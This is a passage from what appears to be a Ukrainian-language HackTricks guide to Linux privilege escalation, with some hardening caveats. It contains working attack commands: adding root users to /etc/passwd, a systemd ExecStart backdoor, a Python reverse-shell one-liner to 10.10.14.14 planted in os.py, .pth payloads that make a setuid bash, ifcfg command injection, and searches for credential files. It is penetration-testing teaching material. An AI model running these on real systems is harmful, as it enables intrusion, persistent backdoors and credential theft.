У деяких випадках можна знайти **хеші паролів** у файлі `/etc/passwd` (або його аналогу)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Доступний для запису /etc/passwd

Спочатку згенеруйте пароль за допомогою однієї з таких команд.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Потім додайте користувача hacker і встановіть згенерований пароль.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер можна використовувати команду `su` з `hacker:hacker`

Також можна скористатися наведеними нижче рядками, щоб додати фіктивного користувача без пароля.\
УВАГА: це може знизити поточний рівень безпеки машини.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

ПРИМІТКА: На платформах BSD файл `/etc/passwd` розташований у `/etc/pwd.db` і `/etc/master.passwd`, а `/etc/shadow` перейменовано на `/etc/spwd.db`.

Перевірте, чи можете ви **записувати в деякі конфіденційні файли**. Наприклад, чи можете ви записувати в якийсь **файл конфігурації служби**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Наприклад, якщо на машині запущено сервер **tomcat** і ви можете **змінити файл конфігурації служби Tomcat у /etc/systemd/,** тоді ви можете змінити рядки:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Ваш backdoor буде виконано під час наступного запуску tomcat.

### Перевірте каталоги

У таких каталогах можуть міститися резервні копії або цікава інформація: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Ймовірно, ви не зможете прочитати останній, але спробуйте)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Незвичне розташування/файли у власності

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Файли, змінені за останні хвилини

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Файли баз даних SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Для доступних для читання баз даних застосунків перевіряйте назви таблиць і стовпців на наявність імен користувачів і хешів паролів. Виявлення хешу, відновлення пароля та підтвердження його повторного використання для локального облікового запису — це окремі кроки; звичайного 32-символьного шістнадцяткового рядка недостатньо, щоб визначити, що це MD5, або встановити доступ до облікового запису.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Якщо в доступній для читання історії команд оболонки є команда `sudo`, за якою йде короткий рядок, схожий на пароль, вручну перевірте сусідні рядки. Пароль, введений у звичайний запит `sudo`, не зберігається в історії команд оболонки; наступний рядок — лише можливе випадкове введення в оболонку, а не доказ того, що це дійсний пароль. Маркер `.sudo_as_admin_successful` фіксує попереднє використання, а не поточні права доступу.

### Приховані файли

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Скрипти/бінарні файли в PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Вебфайли**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Резервні копії**

Перевіряйте файли, доступні для читання в каталогах резервних копій, а також файли, у **назвах** яких є `backup`: архів із неочевидною назвою або зашифрованим розширенням усе ще може містити старі дані застосунку. Зашифрований архів — лише потенційне джерело витоку. Відновлення пароля, перегляд його вмісту, отримання хешу застосунку та повторне використання цього пароля для Unix-облікового запису — окремі кроки, які потрібно перевірити; наявність хешу в архіві не підтверджує можливість локального входу.

Доступні для читання резервні копії віртуальних машин також варто перевіряти. Конфігурація VirtualBox `.vbox` може вказувати на підключені образи `.vdi` і містити метадані ключа шифрування диска; [VirtualBox документує, що ключ шифрування даних зберігається в конфігурації ВМ](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Перш ніж переглядати диск офлайн, потрібно мати доступ і до конфігурації, і до образу. Гостьовий том може мати власний [рівень шифрування LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), для якого потрібен окремий ключ. Навіть після санкціонованого розшифрування старі скрипти або конфігурації можуть містити пароль; перш ніж називати це локальним підвищенням привілеїв, переконайтеся, що ці облікові дані досі чинні для облікового запису на хості, а його ефективна політика `sudo` дозволяє виконати привілейовану команду. Під час пасивного збору даних інвентаризуйте шляхи й дозволи, не копіюючи, не розшифровуючи та не монтувавши образи.

Переглядаючи доступний для читання архів, спершу виведіть список назв файлів у ньому, не розпаковуючи нічого: там можуть бути приховані файли автентифікатора, матеріали з кодами відновлення або SSH-ключі, навіть якщо активні копії захищені. Назви файлів лише вказують на можливий напрямок перевірки; окремо перевірте самі матеріали та повторне використання облікового запису.

Насамперед перевіряйте **архіви в каталогах резервних копій, доступні для читання та належні іншому користувачеві**, особливо архіви, що належать root, і ті, доступ до яких надає членство в групі. Старий архів може містити конфігурацію або секрет автентифікації, навіть якщо активна копія захищена. Для локального інтерфейсу резервного копіювання, як-от [Backrest](https://garethgeorge.github.io/backrest/), перевірте ефективний обліковий запис служби та з’ясуйте, чи може користувач із нижчими привілеями читати її конфігурацію або автентифікуватися в інтерфейсі. Його [хуки](https://garethgeorge.github.io/backrest/docs/hooks) і [інтерфейс команд restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) можуть виконувати операції з привілеями служби щодо файлів і команд; сам факт прослуховування loopback-інтерфейсу не визначає рівень впливу. `passwordBcrypt` у Backrest — це bcrypt-хеш у кодуванні base64 у його [коді автентифікації](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), а не пароль у відкритому вигляді. Перш ніж вважати доступний архів або інтерфейс межею привілеїв, перевірте ідентичність служби, придатність облікових даних і доступ до відповідного плану або сховища.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Відомі файли, що містять паролі

Перегляньте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS): він шукає **кілька можливих файлів, які можуть містити паролі**.\
**Ще один цікавий інструмент**, який можна використати для цього, — [**LaZagne**](https://github.com/AlessandroZ/LaZagne), застосунок з відкритим кодом для отримання багатьох паролів, збережених на локальному комп’ютері з Windows, Linux або Mac.

Якщо файл `/etc/guacamole/guacamole.properties` доступний для читання, перегляньте параметри підключення до баз даних `mysql-*`, `postgresql-*` або `sqlserver-*`. Якщо обліковий запис має дозвіл читати таблиці Guacamole JDBC, таблиця `guacamole_connection_parameter` може містити збережені значення SSH `username`, `password`, `private-key` або `passphrase`. Спершу перегляньте ідентифікатори підключень та назви параметрів, а потім перевірте лише відповідні рядки; збережене значення може бути динамічним токеном або посиланням на сховище, а не секретом, який можна повторно використати. Див. [схему Guacamole JDBC](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) та [параметри SSH-підключення](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

[Менеджер паролів pswm](https://github.com/Julynx/pswm#usage) за замовчуванням зберігає зашифроване сховище у `~/.local/share/pswm/pswm`. Якщо сховище іншого користувача доступне для перегляду, перевірте його власника та чи справді ваш обліковий запис може його читати. Сам шлях до сховища не розкриває облікові дані: відновлення його майстер-пароля, пошук пароля облікового запису, який можна повторно використати, та перевірка привілеїв цього облікового запису — окремі кроки.

[База даних Passpie за замовчуванням](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) розташована в `~/.passpie/`; вона містить зв’язку ключів `.keys` і зашифровані файли облікових даних `.pass` у групових каталогах. Видимий каталог бази даних — лише зачіпка щодо шляху: підтвердьте доступ до ключа та відповідного зашифрованого запису, наявність потрібної майстер-фрази та те, чи належать відновлені облікові дані привілейованішому обліковому запису. Passpie також підтримує [власні шляхи до баз даних](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), тож шлях за замовчуванням не є вичерпним. Автоматизований перебір має перелічувати метадані, не експортувавши облікові дані й не виводячи матеріал ключа.

### Журнали

Якщо ви можете читати журнали, то, можливо, знайдете в них **цікаву/конфіденційну інформацію**. Що дивніший журнал, то цікавішим він буде (ймовірно).\
Також деякі **«погано»** налаштовані (зі встановленим бекдором?) **журнали аудиту** можуть дозволити вам **записувати паролі** в журнали аудиту, як пояснено в цій публікації: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Щоб **читати журнали, група** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Файли оболонки

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Загальний пошук Creds/Regex

Також варто перевірити, чи є файли, у **назві** або вмісті яких міститься слово «**password**», а також пошукати IP-адреси й адреси електронної пошти в логах або хеші за допомогою регулярних виразів.\
Я не буду тут описувати, як усе це робити, але якщо вам цікаво, можете переглянути останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли, доступні для запису

### Python library hijacking

Якщо ви знаєте, **звідки** буде виконуватися python-скрипт, і **можете записувати** в цю папку або змінювати python-бібліотеки, ви можете змінити бібліотеку ОС і додати до неї backdoor (якщо можете записувати в папку, звідки виконується python-скрипт, скопіюйте й вставте туди бібліотеку os.py).

Щоб **додати backdoor до бібліотеки**, просто додайте в кінець бібліотеки os.py такий рядок (змініть IP і PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### Записуваний `.pth`, який обробляє `site.addsitedir()`

Не вважайте `site.addsitedir(DIR)` еквівалентом `sys.path.append(DIR)`. Ця функція також обробляє кожен файл `*.pth` у `DIR`. Рядок, що починається з `import`, за яким іде пробіл або табуляція, виконується як код Python. Рядки зі шляхами натомість визначаються відносно каталогу site і додаються, лише якщо такі шляхи існують.<sup>[[38]](#references)</sup>

Це може призвести до підвищення привілеїв, якщо дозволена через sudo або інша привілейована програма Python викликає `site.addsitedir()` для каталогу, доступного для запису поточному користувачеві або одній із його груп. Код `.pth` виконується, коли привілейована програма налаштовує шлях імпорту, ще до виконання її звичайної дії.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Виконуваний вміст `.pth` має вміщатися в один рядок, але крапки з комою дають змогу виконати кілька інструкцій. Наприклад, шлях виконання від root може створити копію Bash із setuid; запускайте Bash із `-p`, щоб зберегти ефективний ID.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

Параметр `-S` лише вимикає автоматичну ініціалізацію `site` у Python. Він не захищає програму, яка явно імпортує `site` і викликає `site.addsitedir()`. Приберіть каталоги, доступні для запису зловмиснику, зі шляхів імпорту з привілеями та вимагайте, щоб каталог і його файли `.pth` належали лише привілейованому адміністратору й були доступні для запису тільки йому.<sup>[[38]](#references)[[39]](#references)</sup>

### Експлуатація logrotate

Привілейоване завдання `logrotate` може створити шлях для запису файлів від імені іншого користувача, якщо воно справді ротувати журнал у каталозі, який користувач із нижчими привілеями може підмінити або перенаправити під час ротації. Сам факт, що журнал доступний для запису, — лише підказка. Перевірте точне активне правило та його директиви `create`, `olddir` і `su`; фактичні облікові дані планувальника; права на запис і пошук у батьківському каталозі журналу; а також те, чи дозволяють установлену збірку та політика змінювати призначення. Щоб запис у файл запуску призвів до виконання команд, подальша привілейована оболонка має завантажити створений файл. Перевірте розклад, правило, версію/пакування та метадані шляхів, не запускаючи ротацію й не намагаючись скористатися гонкою.

> [!TIP]
> Не вважайте `3.18.0` чи будь-який рядок версії самостійною межею експлуатованості. [Журнал змін upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) містить записи про посилення захисту каталогів і символічних посилань у кількох випусках, а дистрибутиви можуть переносити виправлення в попередні версії. [Посібник upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) рекомендує використовувати `su`, коли root ротатує журнали в каталогах, контрольованих непривілейованими користувачами; перевірте фактичне правило та поведінку.

Докладнішу інформацію про вразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Цю вразливість можна експлуатувати за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця вразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(журнали nginx)**, тому щоразу, коли виявляєте можливість змінювати журнали, перевіряйте, хто ними керує та чи можна підвищити привілеї, підмінивши журнали символічними посиланнями.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Посилання на вразливість:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Файл `ifcfg-*` є приводом для перевірки, якщо користувач із нижчими привілеями може створити або змінити його **і** привілейований шлях активації мережі зчитує саме цей файл. Перевірте фактичні дозволи на файл і каталог, вибраний інтерфейс, установлену реалізацію `ifup`/`ifdown` і те, хто її викликає. Сам по собі файл, доступний для запису, не призводить до виконання коду. [Посібник Red Hat з роботи в мережі для RHEL 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) розрізняє застарілі мережеві скрипти та NetworkManager: останній сам по собі не запускає перші. [Документація RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) зазначає, що стандартні `ifup`/`ifdown` використовують NetworkManager, а необов’язковий застарілий пакет містить shell-скрипти.

У системі, що справді використовує привілейовані застарілі скрипти, не взяте в лапки присвоєння в `ifcfg-*`, яке обробляється як shell-код, наприклад `NAME=`, може перетнути межу виконання коду. Перевірте точний парсер, значення та шлях активації; не робіть висновків про обробку shell лише з назви файлу чи наявності NetworkManager. Обгортка, дозволена через sudo, яка записує введені користувачем дані у файл `ifcfg-*`, а потім викликає застарілий `ifup`, є окремим шляхом до цієї межі, навіть якщо користувач не може безпосередньо редагувати файл.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Зверніть увагу на пробіл між Network і /bin/id_)

### **init, init.d, systemd і rc.d**

Каталог `/etc/init.d` містить **скрипти** для System V init (SysVinit) — **класичної системи керування службами Linux**. Він містить скрипти для `start`, `stop`, `restart` і, іноді, `reload` служб. Їх можна виконувати безпосередньо або через символічні посилання в `/etc/rc?.d/`. У системах Redhat є альтернативний шлях: `/etc/rc.d/init.d`.

Натомість `/etc/init` пов’язаний з **Upstart** — новішою **системою керування службами**, представленою Ubuntu, яка використовує файли конфігурації для керування службами. Попри перехід на Upstart, скрипти SysVinit і далі використовуються разом із конфігураціями Upstart завдяки рівню сумісності в Upstart.

**systemd** — це сучасна система ініціалізації та керування службами, що пропонує розширені функції, як-от запуск демонів на вимогу, керування автоматичним монтуванням і створення знімків стану системи. Вона впорядковує файли: пакети дистрибутивів розміщуються в `/usr/lib/systemd/`, а зміни адміністратора — в `/etc/systemd/system/`, що спрощує адміністрування системи.<sup>[[21]](#references)</sup>

## Інші трюки

### Підвищення привілеїв через NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Вихід з обмежених оболонок


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco — vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Фреймворки для rooting Android: зловживання каналом менеджера

Фреймворки для rooting Android зазвичай перехоплюють системний виклик, щоб надати менеджеру в просторі користувача доступ до привілейованих функцій ядра. Слабка автентифікація менеджера (наприклад, перевірки підпису на основі порядку FD або ненадійні схеми паролів) може дозволити локальному застосунку видати себе за менеджера та отримати root на вже rooted-пристроях. Докладніше про це та експлуатацію — тут:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Виявлення служб VMware Tools і LPE (CWE-426) через виконання команд на основі regex (CVE-2025-41244)

Виявлення служб на основі regex у VMware Tools/Aria Operations може отримати шлях до бінарного файла з командних рядків процесів і виконати його з параметром -v у привілейованому контексті. Надто дозвільні шаблони (наприклад, із використанням \S) можуть збігтися з підготовленими зловмисником слухачами у доступних для запису каталогах (наприклад, /tmp/httpd), що призводить до виконання від root (CWE-426 — ненадійний шлях пошуку).<sup>[[27]](#references)</sup>

Докладніше та узагальнений шаблон, застосовний до інших систем виявлення й моніторингу, дивіться тут:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Захист ядра

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Додаткова допомога

[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)

## Інструменти для підвищення привілеїв у Linux/Unix

### **Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(параметр -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Перелік вразливостей ядра в Linux і MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (фізичний доступ):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Збірка інших скриптів**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning (підвищення привілеїв через інтерфейс Crontab UI, повторне використання облікових даних zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: підроблений payload .text_sig для монітора, що запускається через cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: обхід Neighborhood Watch (перехоплення sudo env_keep PATH)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Базове підвищення привілеїв у Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Посібник із підвищення привілеїв у Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Атака й захист: методи підвищення привілеїв у Linux у 2016 році](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Ніхто не очікував виконання команди!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (підвищення привілеїв у Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – покроковий розбір лабораторних вправ - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: поради й підказки щодо підвищення привілеїв у Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: інструмент переліку даних і підвищення привілеїв у Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [Що таке сокет?](https://www.linux.com/news/what-socket/)
- [15] [Розбір Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Знайомство з D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Виконувані файли SUID: підвищення привілеїв у Linux](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo, частина 2 — підвищення привілеїв у Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Як керувати ACL у Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Отримання root у Redhat/CentOS через network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Що таке systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (ін’єкція в арифметичні вирази bash через журнали, повний ланцюжок)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Посібник GNU Bash — BASH_ENV (файл запуску для неінтерактивного режиму)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + підвищення привілеїв через символічне посилання TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (копіювання через cron pg_basebackup → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Назвіть це як завгодно — VMware підвищує привілеї (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: підвищення привілеїв через Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – уразливості підвищення привілеїв у Sudo: CVE-2025-32462 і CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – каталоги сховищ PYC](https://peps.python.org/pep-3147/)
- [32] [Документація Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit, issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Твіт від @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com — журналювання паролів у Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at — подробиці про race condition у logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Документація Python 3.10 — файли конфігурації `site` і шляхів](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
